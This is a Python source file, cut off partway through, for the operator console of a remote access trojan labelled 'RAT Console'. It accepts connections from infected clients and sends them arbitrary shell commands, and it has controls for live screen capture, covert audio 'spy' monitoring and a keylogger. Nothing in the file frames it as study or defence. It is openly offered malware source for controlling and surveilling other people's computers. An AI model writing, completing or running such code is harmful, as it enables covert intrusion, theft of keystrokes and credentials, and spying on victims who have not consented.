import socket
import threading
import time
import struct
import os
import random
import io
import zlib
import cv2
import numpy as np
import pyaudio
from PIL import ImageGrab, Image
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import customtkinter as ctk
from typing import Dict, List, Tuple, Optional
import json

# Define theme settings
THEMES = {
    "dark": {
        "bg_color": "#1E1E1E",
        "fg_color": "#F0F0F0",
        "accent_color": "#007BFF",
        "secondary_color": "#6C757D",
        "success_color": "#28A745",
        "danger_color": "#DC3545",
        "warning_color": "#FFC107",
        "info_color": "#17A2B8"
    },
    "light": {
        "bg_color": "#F8F9FA",
        "fg_color": "#212529",
        "accent_color": "#0069D9",
        "secondary_color": "#5A6268",
        "success_color": "#218838",
        "danger_color": "#C82333",
        "warning_color": "#E0A800",
        "info_color": "#138496"
    },
    "hacker": {
        "bg_color": "#0A0A0A",
        "fg_color": "#00FF00",
        "accent_color": "#32CD32",
        "secondary_color": "#228B22",
        "success_color": "#7CFC00",
        "danger_color": "#FF0000",
        "warning_color": "#FFFF00",
        "info_color": "#00FFFF"
    }
}

class RATServerGUI:
    def __init__(self):
        # Initialize server variables
        self.ip = "127.0.0.1"
        self.port = 4444
        self.address = (self.ip, self.port)
        self.is_server_running = False
        self.receive_screenshot_trigger = False
        self.audiospy_trigger = False
        self.keyboard_recording_trigger = False
        self.clients = {}
        self.threads_tracker = {}
        self.BUFFER = 4096
        self.client_counter = 0
        self.current_theme = "dark"
        self.server_socket = None
        self.current_client_socket = None

        # Setup GUI
        self.setup_gui()
        
    def setup_gui(self):
        # Configure custom tkinter
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        # Create root window
        self.root = ctk.CTk()
        self.root.title("Advanced Remote Administration Tool")
        self.root.geometry("1200x700")
        self.root.minsize(800, 600)
        
        # Create main frame
        self.main_frame = ctk.CTkFrame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Split into left sidebar and right content
        self.sidebar_frame = ctk.CTkFrame(self.main_frame, width=200)
        self.sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        
        self.content_frame = ctk.CTkFrame(self.main_frame)
        self.content_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Setup sidebar
        self.setup_sidebar()
        
        # Setup content area
        self.setup_content_area()
        
        # Setup status bar
        self.status_bar = ctk.CTkLabel(self.root, text="Ready", anchor="w")
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)
        
        # Load settings
        self.load_settings()
        
    def setup_sidebar(self):
        # Logo/Title
        logo_label = ctk.CTkLabel(self.sidebar_frame, text="RAT Console", font=ctk.CTkFont(size=20, weight="bold"))
        logo_label.pack(pady=20)
        
        # Server controls
        server_frame = ctk.CTkFrame(self.sidebar_frame)
        server_frame.pack(fill=tk.X, padx=10, pady=10)
        
        server_label = ctk.CTkLabel(server_frame, text="Server Controls", font=ctk.CTkFont(weight="bold"))
        server_label.pack(pady=5)
        
        # IP and Port inputs
        ip_frame = ctk.CTkFrame(server_frame)
        ip_frame.pack(fill=tk.X, pady=5)
        
        ip_label = ctk.CTkLabel(ip_frame, text="IP:", width=30)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        self.ip_entry = ctk.CTkEntry(ip_frame)
        self.ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.ip_entry.insert(0, self.ip)
        
        port_frame = ctk.CTkFrame(server_frame)
        port_frame.pack(fill=tk.X, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=30)
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(port_frame)
        self.port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.port_entry.insert(0, str(self.port))
        
        # Server buttons
        self.start_server_btn = ctk.CTkButton(server_frame, text="Start Server", command=self.start_server_gui)
        self.start_server_btn.pack(fill=tk.X, pady=5)
        
        self.stop_server_btn = ctk.CTkButton(server_frame, text="Stop Server", command=self.stop_server, state="disabled")
        self.stop_server_btn.pack(fill=tk.X, pady=5)
        
        # Theme selection
        theme_frame = ctk.CTkFrame(self.sidebar_frame)
        theme_frame.pack(fill=tk.X, padx=10, pady=10)
        
        theme_label = ctk.CTkLabel(theme_frame, text="Theme", font=ctk.CTkFont(weight="bold"))
        theme_label.pack(pady=5)
        
        self.theme_var = tk.StringVar(value=self.current_theme)
        theme_options = ctk.CTkOptionMenu(theme_frame, values=list(THEMES.keys()), 
                                          variable=self.theme_var, command=self.change_theme)
        theme_options.pack(fill=tk.X, pady=5)
        
    def setup_content_area(self):
        # Create notebook for tabbed interface
        self.notebook = ttk.Notebook(self.content_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Dashboard tab
        self.dashboard_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.setup_dashboard()
        
        # Clients tab
        self.clients_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.clients_frame, text="Clients")  
        self.setup_clients_tab()
        
        # Command tab
        self.command_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.command_frame, text="Command Shell")
        self.setup_command_tab()
        
        # Monitoring tab
        self.monitoring_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.monitoring_frame, text="Monitoring")
        self.setup_monitoring_tab()
        
        # Settings tab
        self.settings_frame = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.settings_frame, text="Settings")
        self.setup_settings_tab()
        
    def setup_dashboard(self):
        # Status panel
        status_frame = ctk.CTkFrame(self.dashboard_frame)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Server status
        server_status_label = ctk.CTkLabel(status_frame, text="Server Status:", font=ctk.CTkFont(weight="bold"))
        server_status_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        self.server_status_value = ctk.CTkLabel(status_frame, text="Offline", text_color=THEMES[self.current_theme]["danger_color"])
        self.server_status_value.grid(row=0, column=1, padx=10, pady=5, sticky="w")
        
        # Active clients
        clients_label = ctk.CTkLabel(status_frame, text="Active Clients:", font=ctk.CTkFont(weight="bold"))
        clients_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        
        self.clients_value = ctk.CTkLabel(status_frame, text="0")
        self.clients_value.grid(row=1, column=1, padx=10, pady=5, sticky="w")
        
        # Activity log
        log_frame = ctk.CTkFrame(self.dashboard_frame)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        log_label = ctk.CTkLabel(log_frame, text="Activity Log", font=ctk.CTkFont(weight="bold"))
        log_label.pack(pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, background=THEMES[self.current_theme]["bg_color"], 
                                                 foreground=THEMES[self.current_theme]["fg_color"], height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.configure(state="disabled")
        
        # Quick actions
        actions_frame = ctk.CTkFrame(self.dashboard_frame)
        actions_frame.pack(fill=tk.X, padx=10, pady=10)
        
        actions_label = ctk.CTkLabel(actions_frame, text="Quick Actions", font=ctk.CTkFont(weight="bold"))
        actions_label.pack(pady=5)
        
        buttons_frame = ctk.CTkFrame(actions_frame)
        buttons_frame.pack(fill=tk.X, pady=5)
        
        refresh_btn = ctk.CTkButton(buttons_frame, text="Refresh Clients", command=self.refresh_clients)
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        disconnect_all_btn = ctk.CTkButton(buttons_frame, text="Disconnect All", command=self.disconnect_all)
        disconnect_all_btn.pack(side=tk.LEFT, padx=5)
        
    def setup_clients_tab(self):
        # Create toolbar
        toolbar_frame = ctk.CTkFrame(self.clients_frame)
        toolbar_frame.pack(fill=tk.X, padx=10, pady=10)
        
        refresh_btn = ctk.CTkButton(toolbar_frame, text="Refresh", command=self.refresh_clients)
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        # Create clients table frame
        table_frame = ctk.CTkFrame(self.clients_frame)
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create treeview for clients
        columns = ("ID", "IP", "Port", "Hostname", "Status")
        self.clients_tree = ttk.Treeview(table_frame, columns=columns, show="headings")
        
        # Define headings
        for col in columns:
            self.clients_tree.heading(col, text=col)
            self.clients_tree.column(col, width=100)
        
        # Configure treeview to use theme colors
        style = ttk.Style()
        style.configure("Treeview", 
                        background=THEMES[self.current_theme]["bg_color"],
                        foreground=THEMES[self.current_theme]["fg_color"],
                        fieldbackground=THEMES[self.current_theme]["bg_color"])
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.clients_tree.yview)
        self.clients_tree.configure(yscroll=scrollbar.set)
        
        # Pack components
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Create client action buttons
        action_frame = ctk.CTkFrame(self.clients_frame)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        connect_btn = ctk.CTkButton(action_frame, text="Connect", command=self.connect_to_client)
        connect_btn.pack(side=tk.LEFT, padx=5)
        
        disconnect_btn = ctk.CTkButton(action_frame, text="Disconnect", command=self.disconnect_client)
        disconnect_btn.pack(side=tk.LEFT, padx=5)
        
        # Right-click menu for clients
        self.client_menu = tk.Menu(self.root, tearoff=0)
        self.client_menu.add_command(label="Connect", command=self.connect_to_client)
        self.client_menu.add_command(label="Disconnect", command=self.disconnect_client)
        self.client_menu.add_separator()
        self.client_menu.add_command(label="View Details", command=self.view_client_details)
        
        # Bind events
        self.clients_tree.bind("<Button-3>", self.show_client_menu)
        self.clients_tree.bind("<Double-1>", lambda e: self.connect_to_client())
        
    def setup_command_tab(self):
        # Create top info frame
        info_frame = ctk.CTkFrame(self.command_frame)
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Connected client info
        client_label = ctk.CTkLabel(info_frame, text="Connected Client:", font=ctk.CTkFont(weight="bold"))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.connected_client_label = ctk.CTkLabel(info_frame, text="None")
        self.connected_client_label.pack(side=tk.LEFT, padx=5)
        
        # Output terminal
        terminal_frame = ctk.CTkFrame(self.command_frame)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.terminal_output = scrolledtext.ScrolledText(terminal_frame, wrap=tk.WORD, background="#000000", 
                                                       foreground="#00FF00", height=20)
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.terminal_output.configure(state="disabled")
        
        # Command input
        input_frame = ctk.CTkFrame(self.command_frame)
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        
        prompt_label = ctk.CTkLabel(input_frame, text=">", width=20)
        prompt_label.pack(side=tk.LEFT, padx=5)
        
        self.command_input = ctk.CTkEntry(input_frame)
        self.command_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.command_input.bind("<Return>", self.send_command)
        
        send_btn = ctk.CTkButton(input_frame, text="Send", command=lambda: self.send_command(None))
        send_btn.pack(side=tk.RIGHT, padx=5)
        
    def setup_monitoring_tab(self):
        # Create tab control for different monitoring options
        monitor_notebook = ttk.Notebook(self.monitoring_frame)
        monitor_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Screen tab
        screen_frame = ctk.CTkFrame(monitor_notebook)
        monitor_notebook.add(screen_frame, text="Screen")
        
        screen_controls = ctk.CTkFrame(screen_frame)
        screen_controls.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_screen_btn = ctk.CTkButton(screen_controls, text="Start Screen Capture", 
                                            command=self.start_screen_capture)
        self.start_screen_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_screen_btn = ctk.CTkButton(screen_controls, text="Stop Screen Capture", 
                                           command=self.stop_screen_capture, state="disabled")
        self.stop_screen_btn.pack(side=tk.LEFT, padx=5)
        
        self.screen_display = tk.Label(screen_frame, text="No screen capture active", 
                                     background=THEMES[self.current_theme]["bg_color"],
                                     foreground=THEMES[self.current_theme]["fg_color"])
        self.screen_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Audio tab
        audio_frame = ctk.CTkFrame(monitor_notebook)
        monitor_notebook.add(audio_frame, text="Audio")
        
        audio_controls = ctk.CTkFrame(audio_frame)
        audio_controls.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_audio_btn = ctk.CTkButton(audio_controls, text="Start Audio Monitoring", 
                                           command=self.start_audio_monitoring)
        self.start_audio_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_audio_btn = ctk.CTkButton(audio_controls, text="Stop Audio Monitoring", 
                                          command=self.stop_audio_monitoring, state="disabled")
        self.stop_audio_btn.pack(side=tk.LEFT, padx=5)
        
        # Audio visualization placeholder
        self.audio_display = tk.Label(audio_frame, text="No audio monitoring active", 
                                    background=THEMES[self.current_theme]["bg_color"],
                                    foreground=THEMES[self.current_theme]["fg_color"])
        self.audio_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Keyboard tab
        keyboard_frame = ctk.CTkFrame(monitor_notebook)
        monitor_notebook.add(keyboard_frame, text="Keyboard")
        
        keyboard_controls = ctk.CTkFrame(keyboard_frame)
        keyboard_controls.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_keyboard_btn = ctk.CTkButton(keyboard_controls, text="Start Keylogger", 
                                              command=self.start_keylogger)
        self.start_keyboard_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_keyboard_btn = ctk.CTkButton(keyboard_controls, text="Stop Keylogger", 
                                             command=self.stop_keylogger, state="disabled")
        self.stop_keyboard_btn.pack(side=tk.LEFT, padx=5)
        
        # Keyboard log
        self.keyboard_log = scrolledtext.ScrolledText(keyboard_frame, wrap=tk.WORD, 
                                                    background=THEMES[self.current_theme]["bg_color"], 
                                                    foreground=THEMES[self.current_theme]["fg_color"])
        self.keyboard_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def setup_settings_tab(self):
        # General settings
        general_frame = ctk.CTkFrame(self.settings_frame)
        general_frame.pack(fill=tk.X, padx=10, pady=10)
        
        general_label = ctk.CTkLabel(general_frame, text="General Settings", font=ctk.CTkFont(weight="bold"))
        general_label.pack(pady=5)
        
        # Buffer size
        buffer_frame = ctk.CTkFrame(general_frame)
        buffer_frame.pack(fill=tk.X, pady=5)
        
        buffer_label = ctk.CTkLabel(buffer_frame, text="Buffer Size:", width=100)
        buffer_label.pack(side=tk.LEFT, padx=5)
        
        self.buffer_entry = ctk.CTkEntry(buffer_frame)
        self.buffer_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.buffer_entry.insert(0, str(self.BUFFER))
        
        # Auto-save settings
        self.autosave_var = tk.BooleanVar(value=True)
        autosave_check = ctk.CTkCheckBox(general_frame, text="Auto-save settings", variable=self.autosave_var)
        autosave_check.pack(anchor="w", padx=5, pady=5)
        
        # Save/Load buttons
        btn_frame = ctk.CTkFrame(general_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        save_settings_btn = ctk.CTkButton(btn_frame, text="Save Settings", command=self.save_settings)
        save_settings_btn.pack(side=tk.LEFT, padx=5)
        
        load_settings_btn = ctk.CTkButton(btn_frame, text="Load Settings", command=self.load_settings)
        load_settings_btn.pack(side=tk.LEFT, padx=5)
        
        # About section
        about_frame = ctk.CTkFrame(self.settings_frame)
        about_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        about_label = ctk.CTkLabel(about_frame, text="About", font=ctk.CTkFont(weight="bold"))
        about_label.pack(pady=5)
        
        about_text = ctk.CTkLabel(about_frame, text="Advanced Remote Administration Tool\nVersion 1.0")
        about_text.pack(pady=5)
        
    # Utility functions
    def log(self, msg):
        # Update log in GUI
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] {str(msg)}"
        
        self.log_text.configure(state="normal")
        self.log_text.insert(tk.END, log_entry + "\n")
        self.log_text.see(tk.END)
        self.log_text.configure(state="disabled")
        
        # Update status bar
        self.status_bar.configure(text=str(msg))
        
    def change_theme(self, theme_name):
        self.current_theme = theme_name
        
        # Apply theme to various components
        self.root.configure(fg_color=THEMES[theme_name]["bg_color"])
        self.status_bar.configure(text_color=THEMES[theme_name]["fg_color"])
        
        # Update log colors
        self.log_text.configure(background=THEMES[theme_name]["bg_color"], 
                              foreground=THEMES[theme_name]["fg_color"])
        
        # Update terminal colors (keep green for hacker aesthetic)
        if theme_name == "hacker":
            self.terminal_output.configure(background="#000000", foreground="#00FF00")
        else:
            self.terminal_output.configure(background=THEMES[theme_name]["bg_color"], 
                                         foreground=THEMES[theme_name]["fg_color"])
        
        # Update clients tree
        style = ttk.Style()
        style.configure("Treeview", 
                        background=THEMES[theme_name]["bg_color"],
                        foreground=THEMES[theme_name]["fg_color"],
                        fieldbackground=THEMES[theme_name]["bg_color"])
        
        # Update other components as needed
        self.keyboard_log.configure(background=THEMES[theme_name]["bg_color"], 
                                   foreground=THEMES[theme_name]["fg_color"])
        
        # Log theme change
        self.log(f"Theme changed to: {theme_name}")
        
    def save_settings(self):
        # Get current settings
        settings = {
            "ip": self.ip_entry.get(),
            "port": int(self.port_entry.get()),
            "buffer": int(self.buffer_entry.get()),
            "theme": self.current_theme,
            "autosave": self.autosave_var.get()
        }
        
        # Save to file
        try:
            with open("rat_settings.json", "w") as f:
                json.dump(settings, f)
            self.log("Settings saved successfully")
        except Exception as e:
            self.log(f"Error saving settings: {e}")
            messagebox.showerror("Error", f"Could not save settings: {e}")
    
    def load_settings(self):
        try:
            with open("rat_settings.json", "r") as f:
                settings = json.load(f)
                
            # Apply settings
            self.ip_entry.delete(0, tk.END)
            self.ip_entry.insert(0, settings.get("ip", "127.0.0.1"))
            
            self.port_entry.delete(0, tk.END)
            self.port_entry.insert(0, str(settings.get("port", 4444)))
            
            self.buffer_entry.delete(0, tk.END)
            self.buffer_entry.insert(0, str(settings.get("buffer", 4096)))
            
            self.BUFFER = settings.get("buffer", 4096)
            self.current_theme = settings.get("theme", "dark")
            self.theme_var.set(self.current_theme)
            self.change_theme(self.current_theme)
            
            self.autosave_var.set(settings.get("autosave", True))
            
            self.log("Settings loaded successfully")
        except FileNotFoundError:
            self.log("No settings file found. Using defaults.")
        except Exception as e:
            self.log(f"Error loading settings: {e}")
    
    # Server operations
    def start_server_gui(self):
        # Get IP and port from inputs
        try:
            self.ip = self.ip_entry.get()
            self.port = int(self.port_entry.get())
            self.address = (self.ip, self.port)
            
            threading.Thread(target=self.start_server, daemon=True).start()

            self.start_server_btn.configure(state="disabled")
            self.stop_server_btn.configure(state="normal")
            
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid number")
        except Exception as e:
            messagebox.showerror("Error", f"Could not start server: {e}")
    
    def start_server(self):
        if not self.is_server_running:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind(self.address)
                self.server_socket.listen()
                self.is_server_running = True
                
                self.server_status_value.configure(text="Online", text_color=THEMES[self.current_theme]["success_color"])
                self.log(f"Server is now running on {self.address[0]}:{self.address[1]}")
                
                threading.Thread(target=self.accept_clients, daemon=True).start()
                
            except (ConnectionError, ConnectionResetError, ConnectionRefusedError) as err:
                self.log(f"Connection Error: {err}")
                self.is_server_running = False
                self.stop_server()
                messagebox.showerror("Connection Error", str(err))
        else:
            self.log("Server Already Running")
    
    def accept_clients(self):
        while self.is_server_running:
            try:
                conn, addr = self.server_socket.accept()
                self.log(f"Client connected: {addr[0]}:{addr[1]}")
                
                self.clients[(addr[0], addr[1])] = (self.client_counter, conn)
                self.client_counter += 1
                
                self.clients_value.configure(text=str(len(self.clients)))
                
                try:
                    hostname = self.getHostName(conn)
                except:
                    hostname = "Unknown"
                    
                self.clients_tree.insert("", "end", values=(self.client_counter - 1, addr[0], addr[1], hostname, "Connected"))
                
            except OSError:
                break
            except Exception as e:
                self.log(f"Error accepting client: {e}")
    
    def stop_server(self):
        try:
            if self.is_server_running:
                self.is_server_running = False
                self.receive_screenshot_trigger = False
                self.audiospy_trigger = False
                self.keyboard_recording_trigger = False
                
                # Close all client connections
                self.disconnect_all()
                
                # Close server socket
                if self.server_socket:
                    self.server_socket.close()
                    self.server_socket = None
                
                # Update UI
                self.server_status_value.configure(text="Offline", text_color=THEMES[self.current_theme]["danger_color"])
                self.start_server_btn.configure(state="normal")
                self.stop_server_btn.configure(state="disabled")
                self.log("Server has been stopped")
            else:
                self.log("Server isn't running")
        except Exception as e:
            if self.server_socket:
                self.server_socket.close()
                self.server_socket = None
            self.log(f"Server has been stopped due to an error: {e}")
    
    # Client operations
    def refresh_clients(self):
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        # Re-add clients
        for addr, (client_id, conn) in self.clients.items():
            try:
                hostname = self.getHostName(conn)
            except:
                hostname = "Unknown"
                
            self.clients_tree.insert("", "end", values=(client_id, addr[0], addr[1], hostname, "Connected"))
        
        self.clients_value.configure(text=str(len(self.clients)))
        self.log("Clients list refreshed")
    
    def connect_to_client(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to connect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find the client socket
        for addr, (client_id, conn) in self.clients.items():
            if client_id == selected_id:
                self.current_client_socket = conn
                self.connected_client_label.configure(text=f"{addr[0]}:{addr[1]}")
                
                # Switch to command tab
                self.notebook.select(2)  # Command Shell tab
                
                try:
                    hostname = self.getHostName(conn)
                    self.log(f"Connected to client: {hostname} ({addr[0]}:{addr[1]})")
                    
                    # Clear terminal
                    self.terminal_output.configure(state="normal")
                    self.terminal_output.delete(1.0, tk.END)
                    self.terminal_output.insert(tk.END, f"Connected to {hostname} ({addr[0]}:{addr[1]})\n")
                    self.terminal_output.insert(tk.END, "Type commands and press Enter to execute.\n\n")
                    self.terminal_output.configure(state="disabled")
                    
                except Exception as e:
                    self.log(f"Error connecting to client: {e}")
                
                return
        
        messagebox.showerror("Error", "Could not find selected client")
    
    def disconnect_client(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a client to disconnect")
            return
        
        selected_id = self.clients_tree.item(selection[0])["values"][0]
        
        # Find and remove the client
        client_addr = None
        for addr, (client_id, conn) in list(self.clients.items()):
            if client_id == selected_id:
                client_addr = addr
                try:
                    conn.close()
                except:
                    pass
                
                del self.clients[addr]
                
                # Update UI
                self.clients_tree.delete(selection[0])
                self.clients_value.configure(text=str(len(self.clients)))
                
                # Reset current client if it was the one disconnected
                if self.current_client_socket == conn:
                    self.current_client_socket = None
                    self.connected_client_label.configure(text="None")
                
                self.log(f"Client disconnected: {addr[0]}:{addr[1]}")
                break
        
        if not client_addr:
            messagebox.showerror("Error", "Could not find selected client")
    
    def disconnect_all(self):
        # Close all client connections
        for addr, (_, conn) in list(self.clients.items()):
            try:
                conn.close()
            except:
                pass
        
        # Clear clients dictionary and update UI
        self.clients.clear()
        self.current_client_socket = None
        self.connected_client_label.configure(text="None")
        
        # Clear treeview
        for item in self.clients_tree.get_children():
            self.clients_tree.delete(item)
        
        self.clients_value.configure(text="0")
        self.log("All clients disconnected")
    
    def show_client_menu(self, event):
        # Show context menu on right-click
        if self.clients_tree.selection():
            self.client_menu.post(event.x_root, event.y_root)
    
    def view_client_details(self):
        # Get selected client
        selection = self.clients_tree.selection()
        if not selection:
            return
        
        selected_values = self.clients_tree.item(selection[0])["values"]
        
        # Create details dialog
        details_window = ctk.CTkToplevel(self.root)
        details_window.title("Client Details")
        details_window.geometry("400x300")
        details_window.resizable(False, False)
        
        # Add client details
        frame = ctk.CTkFrame(details_window)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title = ctk.CTkLabel(frame, text="Client Information", font=ctk.CTkFont(size=16, weight="bold"))
        title.pack(pady=10)
        
        # Client ID
        id_frame = ctk.CTkFrame(frame)
        id_frame.pack(fill=tk.X, pady=5)
        
        id_label = ctk.CTkLabel(id_frame, text="Client ID:", width=100)
        id_label.pack(side=tk.LEFT, padx=5)
        
        id_value = ctk.CTkLabel(id_frame, text=str(selected_values[0]))
        id_value.pack(side=tk.LEFT, padx=5)
        
        # IP Address
        ip_frame = ctk.CTkFrame(frame)
        ip_frame.pack(fill=tk.X, pady=5)
        
        ip_label = ctk.CTkLabel(ip_frame, text="IP Address:", width=100)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        ip_value = ctk.CTkLabel(ip_frame, text=selected_values[1])
        ip_value.pack(side=tk.LEFT, padx=5)
        
        # Port
        port_frame = ctk.CTkFrame(frame)
        port_frame.pack(fill=tk.X, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=100)
        port_label.pack(side=tk.LEFT, padx=5)
        
        port_value = ctk.CTkLabel(port_frame, text=str(selected_values[2]))
        port_value.pack(side=tk.LEFT, padx=5)
        
        # Hostname
        hostname_frame = ctk.CTkFrame(frame)
        hostname_frame.pack(fill=tk.X, pady=5)
        
        hostname_label = ctk.CTkLabel(hostname_frame, text="Hostname:", width=100)
        hostname_label.pack(side=tk.LEFT, padx=5)
        
        hostname_value = ctk.CTkLabel(hostname_frame, text=selected_values[3])
        hostname_value.pack(side=tk.LEFT, padx=5)
        
        # Actions
        actions_frame = ctk.CTkFrame(frame)
        actions_frame.pack(fill=tk.X, pady=10)
        
        connect_btn = ctk.CTkButton(actions_frame, text="Connect", 
                                   command=lambda: [details_window.destroy(), self.connect_to_client()])
        connect_btn.pack(side=tk.LEFT, padx=5)
        
        disconnect_btn = ctk.CTkButton(actions_frame, text="Disconnect", 
                                      command=lambda: [details_window.destroy(), self.disconnect_client()])
        disconnect_btn.pack(side=tk.LEFT, padx=5)
        
        close_btn = ctk.CTkButton(actions_frame, text="Close", command=details_window.destroy)
        close_btn.pack(side=tk.RIGHT, padx=5)
    
    # Command functions
    def send_command(self, event):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        command = self.command_input.get()
        if not command:
            return
        
        try:
            # Display command in terminal
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"> {command}\n")
            
            # Send command to client
            result, size = self.send_cmd(self.current_client_socket, command)
            
            # Display result
            self.terminal_output.insert(tk.END, f"{result.decode()}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
            
            # Clear command input
            self.command_input.delete(0, tk.END)
            
        except Exception as e:
            self.log(f"Error sending command: {e}")
            
            self.terminal_output.configure(state="normal")
            self.terminal_output.insert(tk.END, f"Error: {e}\n\n")
            self.terminal_output.see(tk.END)
            self.terminal_output.configure(state="disabled")
    
    # Monitoring functions
    def start_screen_capture(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.receive_screenshot_trigger = True
        threading.Thread(target=self.receive_screenshot_thread, daemon=True).start()
        
        # Update UI
        self.start_screen_btn.configure(state="disabled")
        self.stop_screen_btn.configure(state="normal")
        self.log("Started screen capture")
    
    def receive_screenshot_thread(self):
        try:
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udps.bind(self.address)
            self.current_client_socket.send(b'SCRSHOOT')
            
            while self.receive_screenshot_trigger:
                try:
                    size = self.data_unpacker(udps.recvfrom(8)[0])
                    image_buffer = io.BytesIO()
                    while len(image_buffer.getvalue()) < size:
                        imdata = udps.recvfrom(size)[0]
                        image_buffer.write(imdata)
                    
                    try:
                        decompress_imdata = zlib.decompress(image_buffer.getvalue())
                    except zlib.error:
                        continue
                    
                    npimg = np.frombuffer(decompress_imdata, dtype=np.uint8)
                    decode_img = cv2.imdecode(npimg, cv2.IMREAD_COLOR)
                    colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
                    
                    # Convert to PIL Image for tkinter
                    img = Image.fromarray(colored_image)
                    
                    # Resize to fit the display area
                    img_width, img_height = img.size
                    screen_width = self.screen_display.winfo_width()
                    screen_height = self.screen_display.winfo_height()
                    
                    if screen_width > 10 and screen_height > 10:  # Make sure display has been rendered
                        scale = min(screen_width / img_width, screen_height / img_height)
                        new_width = int(img_width * scale)
                        new_height = int(img_height * scale)
                        img = img.resize((new_width, new_height), Image.LANCZOS)
                    
                    # Convert to PhotoImage and display
                    img_tk = ImageTk.PhotoImage(image=img)
                    self.screen_display.configure(image=img_tk)
                    self.screen_display.image = img_tk  # Keep a reference
                
                except Exception as e:
                    if not self.receive_screenshot_trigger:
                        break
                    self.log(f"Screen capture error: {e}")
                    continue
            
            # Cleanup
            udps.close()
            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_SCRSHOOT')
            
        except Exception as e:
            self.log(f"Screen capture thread error: {e}")
        
        # Reset UI
        self.start_screen_btn.configure(state="normal")
        self.stop_screen_btn.configure(state="disabled")
        self.screen_display.configure(image="")
        self.screen_display.configure(text="No screen capture active")
    
    def stop_screen_capture(self):
        self.receive_screenshot_trigger = False
        self.log("Stopped screen capture")
    
    def start_audio_monitoring(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.audiospy_trigger = True
        threading.Thread(target=self.audio_spy_thread, daemon=True).start()
        
        # Update UI
        self.start_audio_btn.configure(state="disabled")
        self.stop_audio_btn.configure(state="normal")
        self.audio_display.configure(text="Audio monitoring active")
        self.log("Started audio monitoring")
    
    def audio_spy_thread(self):
        try:
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udps.bind(self.address)
            self.current_client_socket.send(b'AUDIO_SPY')
            
